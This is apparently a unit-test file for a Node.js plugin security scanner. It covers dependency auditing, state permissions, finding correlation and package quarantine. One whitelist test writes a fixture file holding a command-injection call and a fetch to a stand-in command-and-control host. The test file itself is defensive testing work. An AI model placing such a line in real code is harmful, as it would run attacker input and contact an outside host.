/**
 * Unit tests for the audit-fix and hardening changes from AUDIT.md:
 * maxLadder precedence (P2-1), failure-≠-clean semantics (P2-2), content
 * fingerprint cache keys (P1-9), state permissions + audit trail (P0-2/P2-9),
 * correlation kill chains (P0-3), and disposition chain symmetry (P1-10).
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync, statSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { maxLadder, auditDependencies, _clearAuditCache } from '../lib/audit.js';
import { openState, scanKey, isFresh, normalizeConfig } from '../lib/state.js';
import { correlateFindings, dispositionSignal } from '../lib/screen.js';
import { decideAction, isProtected, disablePluginInProfile, enablePluginInProfile } from '../lib/disposition.js';
import { fingerprintOf } from '../lib/collect.js';

test('audit P2-1: maxLadder actually returns the max', () => {
  assert.equal(maxLadder('low', 'critical'), 'critical');
  assert.equal(maxLadder('medium', 'high'), 'high');
  assert.equal(maxLadder('critical', 'low'), 'critical');
  assert.equal(maxLadder('none', 'none'), 'none');
  assert.equal(maxLadder('high', undefined), 'high');
});

test('audit P2-2: HTTP failure is unknown, never cached as clean', async () => {
  _clearAuditCache();
  let calls = 0;
  const failing = async () => {
    calls += 1;
    return { ok: false, status: 500, json: async () => ({}) };
  };
  const first = await auditDependencies([{ name: 'left-pad', version: '1.0.0' }], { fetchImpl: failing });
  assert.equal(first.worst, 'none');
  assert.equal(first.errors.length, 1, 'error recorded');
  assert.equal(first.results['left-pad'].unknown, true, 'marked unknown');

  // second call with recovered network must re-query (not serve the 24h lie)
  const serving = async () => {
    calls += 1;
    return {
      ok: true,
      status: 200,
      json: async () => ({ 'left-pad': [{ id: 1, url: 'https://github.com/advisories/GHSA-test-0000', title: 't', severity: 'high', vulnerable_versions: '<2', cwe: [], cvss: { score: 8 } }] }),
    };
  };
  const second = await auditDependencies([{ name: 'left-pad', version: '1.0.0' }], { fetchImpl: serving });
  assert.equal(second.worst, 'high', 'network recovery reflected immediately');
  assert.ok(calls >= 2, 'the failing first pass did not poison the cache');
});

test('audit P2-2: transport throw is unknown too', async () => {
  _clearAuditCache();
  const throwing = async () => { throw new Error('EAI_AGAIN'); };
  const out = await auditDependencies([{ name: 'x', version: '1.0.0' }], { fetchImpl: throwing });
  assert.equal(out.results.x.unknown, true);
  assert.equal(out.errors.length, 1);
});

test('state P0-2: directory is 0700 and the file 0600', () => {
  const home = mkdtempSync(join(tmpdir(), 'sec-state-perm-'));
  const state = openState(home);
  state.writeConfig({ mode: 'enforce' });
  const dirMode = statSync(state.dir).mode & 0o777;
  const fileMode = statSync(state.file).mode & 0o777;
  assert.equal(dirMode & 0o022, 0, 'no group/other write on state dir');
  assert.equal(dirMode & 0o044, 0, 'no group/other read on state dir');
  assert.equal(fileMode & 0o077, 0, 'state file owner-only');
});

test('state P2-9: audit trail records configure and enforcement', () => {
  const home = mkdtempSync(join(tmpdir(), 'sec-state-audit-'));
  const state = openState(home);
  state.writeConfig({ mode: 'enforce' });
  state.audit({ kind: 'auto-disable', name: 'evil-pkg', version: '1.0.0' });
  const log = state.readAuditLog();
  assert.equal(log.length, 2);
  assert.equal(log[0].kind, 'configure');
  assert.equal(log[1].kind, 'auto-disable');
  assert.ok(log[1].at, 'timestamped');
});

test('state P1-9: fingerprint changes the cache key', () => {
  const a = scanKey('pkg', '1.0.0', 'aaaa');
  const b = scanKey('pkg', '1.0.0', 'bbbb');
  const legacy = scanKey('pkg', '1.0.0');
  assert.notEqual(a, b);
  assert.equal(legacy, 'pkg@1.0.0', 'backward-compatible without fp');
  const entry = { name: 'pkg', version: '1.0.0', fingerprint: 'aaaa' };
  assert.equal(isFresh(entry, 'pkg', '1.0.0', 'aaaa'), true);
  assert.equal(isFresh(entry, 'pkg', '1.0.0', 'bbbb'), false, 'content change forces rescan');
});

test('state P1-9: fingerprintOf reacts to file inventory changes', () => {
  const mkTarget = (files, version = '1.0.0') => ({
    version,
    manifest: { name: 'p', version },
    files,
  });
  const base = mkTarget([{ rel: 'lib/index.js', bytes: 100 }]);
  const same = mkTarget([{ rel: 'lib/index.js', bytes: 100 }]);
  const swapped = mkTarget([{ rel: 'lib/index.js', bytes: 9900 }]);
  assert.equal(fingerprintOf(base), fingerprintOf(same), 'identical inventory → same fp');
  assert.notEqual(fingerprintOf(base), fingerprintOf(swapped), 'size change → new fp');
});

test('screen: co-occurring credential and network findings do not establish a data link', () => {
  const findings = [
    { ruleId: 'net-egress', severity: 'medium', evidence: [] },
    { ruleId: 'secret-env', severity: 'high', evidence: [] },
  ];
  const correlated = correlateFindings(findings);
  const egress = correlated.find((f) => f.ruleId === 'net-egress');
  assert.equal(egress.severity, 'medium');
  assert.equal(egress.extra?.correlation, undefined);
  const signal = dispositionSignal(findings);
  assert.equal(signal.level, 'high', 'retain the supplied priority without fabricating critical evidence');
});

test('screen: correlation needs source code, not just rule IDs', () => {
  const findings = [
    { ruleId: 'net-egress', severity: 'medium', evidence: [] },
    { ruleId: 'secret-env', severity: 'high', evidence: [] },
  ];
  assert.equal(dispositionSignal(findings).level, 'high');
});

test('screen P0-3: isolated fragments stay advisory (no over-trigger)', () => {
  assert.equal(dispositionSignal([
    { ruleId: 'net-egress', severity: 'medium', evidence: [] },
  ]).level, 'none', 'egress alone is not a chain');
  assert.equal(dispositionSignal([
    { ruleId: 'secret-env', severity: 'medium', evidence: [] },
  ]).level, 'none', 'named env reads alone are not a chain');
});

test('screen: decoding and execution fragments need an actual execution link', () => {
  assert.equal(dispositionSignal([
    { ruleId: 'obfuscation', severity: 'medium', evidence: [] },
    { ruleId: 'code-exec', severity: 'medium', evidence: [] },
  ]).level, 'none');
  assert.equal(dispositionSignal([
    { ruleId: 'module-hijack', severity: 'high', evidence: [] },
  ]).level, 'high', 'hijack alone is already signal-level');
});

test('disposition P1-10: low-confidence malicious never disables', () => {
  const cfg = { mode: 'enforce', autoDisableAt: 'critical' };
  const base = { signal: { level: 'none', triggers: [] }, depsWorst: 'none', isSelf: false };
  const low = decideAction({ ...base, review: { verdict: 'malicious', confidence: 'low', reason: 'gut feeling' } }, cfg, 'evil');
  assert.equal(low.action, 'review');
  assert.equal(low.reason, 'agent-malicious-low-confidence');
  const medium = decideAction({ ...base, review: { verdict: 'malicious', confidence: 'medium', reason: 'partial' } }, cfg, 'evil');
  assert.equal(medium.action, 'review');
  const high = decideAction({ ...base, review: { verdict: 'malicious', confidence: 'high', reason: 'full chain' } }, cfg, 'evil');
  assert.equal(high.action, 'disable', 'high confidence reaches enforcement');
  const off = decideAction({ ...base, review: { verdict: 'malicious', confidence: 'high', reason: 'full chain' } }, { ...cfg, autoDisableAt: 'never' }, 'evil');
  assert.equal(off.action, 'review', 'restored never option actually disables automatic enforcement');
});

test('disposition P1-10: suspicious has explicit semantics (always review)', () => {
  const cfg = { mode: 'enforce', autoDisableAt: 'critical' };
  const base = { signal: { level: 'none', triggers: [] }, depsWorst: 'none', isSelf: false };
  for (const confidence of ['high', 'medium', 'low']) {
    const out = decideAction({ ...base, review: { verdict: 'suspicious', confidence, reason: 'x' } }, cfg, 'p');
    assert.equal(out.action, 'review', `suspicious/${confidence} → review`);
    assert.equal(out.reason, 'agent-suspicious');
  }
});

test('disposition: protected list is server-enforced', () => {
  assert.equal(isProtected('dsh-plugin-security', {}), true);
  assert.equal(isProtected('dsh-plugin-sentinel', {}), true);
  assert.equal(isProtected('@deepseek-ai/dsh-base', {}), true);
  assert.equal(isProtected('dsh-bots', { protectedNames: ['dsh-bots'] }), true);
  assert.equal(isProtected('random-pkg', {}), false);
});

test('disposition P2-6: disable quarantines the package dir, enable releases it', () => {
  const home = mkdtempSync(join(tmpdir(), 'sec-quarantine-'));
  const profileRoot = join(home, 'profiles', 'p');
  const pkgDir = join(home, 'pkg-under-test');
  mkdirSync(join(profileRoot, 'node_modules'), { recursive: true });
  mkdirSync(pkgDir, { recursive: true });
  writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
    name: 'p', version: '0.0.0', dsh: { profile: { bundles: ['pkg-under-test'] } },
  }));
  writeFileSync(join(pkgDir, 'index.js'), 'export default 1');

  const disabled = disablePluginInProfile(profileRoot, 'pkg-under-test', pkgDir);
  assert.equal(disabled.disabled, true);
  assert.equal(disabled.quarantined, true, 'directory renamed away');
  assert.ok(!existsSync(pkgDir), 'original dir gone');
  assert.ok(existsSync(`${pkgDir}.security-quarantined`), 'quarantine dir present');
  const manifest = JSON.parse(readFileSync(join(profileRoot, 'package.json'), 'utf8'));
  assert.ok(!manifest.dsh.profile.bundles.includes('pkg-under-test'));

  const enabled = enablePluginInProfile(profileRoot, 'pkg-under-test', pkgDir);
  assert.equal(enabled.enabled, true);
  assert.equal(enabled.released, true, 'quarantine released');
  assert.ok(existsSync(pkgDir), 'dir restored');
  const after = JSON.parse(readFileSync(join(profileRoot, 'package.json'), 'utf8'));
  assert.ok(after.dsh.profile.bundles.includes('pkg-under-test'));
});

test('disposition P2-6: quarantine failure degrades to bundles-only', () => {
  const home = mkdtempSync(join(tmpdir(), 'sec-quarantine-fail-'));
  const profileRoot = join(home, 'profiles', 'p');
  mkdirSync(profileRoot, { recursive: true });
  writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
    name: 'p', version: '0.0.0', dsh: { profile: { bundles: ['ghost'] } },
  }));
  // dir does not exist: existsSync guard skips quarantine, bundles still edited
  const out = disablePluginInProfile(profileRoot, 'ghost', join(home, 'nonexistent'));
  assert.equal(out.disabled, true);
  assert.equal(out.quarantined, false);
});

test('config normalize: unknown values fall back safely', () => {
  assert.deepEqual(normalizeConfig({ mode: 'yolo' }), normalizeConfig({}));
  assert.deepEqual(normalizeConfig({ autoDisableAt: 'everything' }), normalizeConfig({}));
  assert.deepEqual(normalizeConfig({ autoUpgrade: 'yes' }), normalizeConfig({}));
  assert.deepEqual(normalizeConfig(null), normalizeConfig({}));
});

test('typert contract: strict invocation descriptors match the registry grammar', async () => {
  const { buildSecurityInvocations } = await import('../lib/remote.js');
  const invocations = buildSecurityInvocations();
  const endpoints = new Set();
  for (const d of invocations) {
    // fields validateInvocation reads unconditionally
    assert.equal(typeof d.id, 'string');
    assert.match(d.service, /^[^#]+$/);
    assert.match(d.namespace, /^[A-Za-z0-9_$.\\-]+$/);
    assert.match(d.method, /^[A-Za-z0-9_$.\\-]+$/);
    assert.equal(d.invocation.kind, 'direct', 'validateInvocation reads invocation.kind unconditionally');
    assert.equal(d.parameters.length, 1);
    assert.equal(d.parameters[0].source, 'json');
    assert.equal(d.parameters[0].codec.mode, 'src-json');
    assert.equal(d.result.mode, 'src-json');
    endpoints.add(`${d.namespace}/${d.method}`);
  }
  assert.deepEqual([...endpoints].sort(), [
    'security/configure', 'security/info', 'security/policy', 'security/reenable', 'security/status', 'security/uninstall', 'security/upgrade',
  ]);
});

test('client dictionaries: zh and en key parity (UI renders both)', async () => {
  // reads the client module source and evaluates the two dictionary literals —
  // the client half is a browser bundle, not importable under node directly
  const { readFileSync } = await import('node:fs');
  const src = readFileSync(new URL('../lib/client.js', import.meta.url), 'utf8');
  const grab = (name) => {
    const start = src.indexOf(`const ${name} = {`);
    const end = src.indexOf('\n    };', start);
    return new Function(`return (${src.slice(src.indexOf('{', start), end + 6)});`)();
  };
  const zh = grab('zh');
  const en = grab('en');
  const zhKeys = Object.keys(zh).sort();
  const enKeys = Object.keys(en).sort();
  assert.deepEqual(enKeys, zhKeys, 'en keys must mirror zh exactly');
  assert.ok(zhKeys.includes('threatsTitle'), 'threats panel translated');
  assert.ok(zhKeys.includes('whitelistTitle'), 'whitelist panel translated');
  assert.ok(zhKeys.includes('uninstallConfirm') && zhKeys.includes('upgradeConfirm'), 'confirm flows translated');
});

test('scan: whitelisted plugins are listed but never screened', async () => {
  const { scanProfile } = await import('../lib/scan.js');
  const { mkdtempSync, mkdirSync, writeFileSync } = await import('node:fs');
  const { tmpdir } = await import('node:os');
  const { join } = await import('node:path');
  const home = mkdtempSync(join(tmpdir(), 'sec-wl-'));
  const profileRoot = join(home, 'profiles', 'p');
  mkdirSync(join(profileRoot, 'node_modules', 'trusted-pkg'), { recursive: true });
  writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({ name: 'p', version: '0.0.0', dsh: { profile: { bundles: ['trusted-pkg'] } } }));
  writeFileSync(join(profileRoot, 'node_modules/trusted-pkg/package.json'), JSON.stringify({ name: 'trusted-pkg', version: '2.0.0' }));
  // suspicious content that WOULD be flagged if the plugin were scanned
  writeFileSync(join(profileRoot, 'node_modules/trusted-pkg/index.js'), "require('child_process').exec(userInput); fetch('https://c2.attacker-xyz.com/x');");

  const state = openState(home);
  state.writeConfig({ protectedNames: ['trusted-pkg'] });
  const report = await scanProfile({ profileRoot, globalRoot: join(home, 'global'), dshHome: home }, {}, { force: true, fetchImpl: async () => ({ ok: false, status: 404, json: async () => ({}) }) });
  const trusted = report.plugins.find((p) => p.name === 'trusted-pkg');
  assert.ok(trusted, 'trusted plugin still listed');
  assert.equal(trusted.trusted, true);
  assert.equal(trusted.findings.length, 0, 'not screened');
  assert.equal(trusted.deps.worst, 'none', 'not audited');
  assert.equal(trusted.disposition.reason, 'whitelisted');
  assert.equal(report.summary.trusted, 1);
});
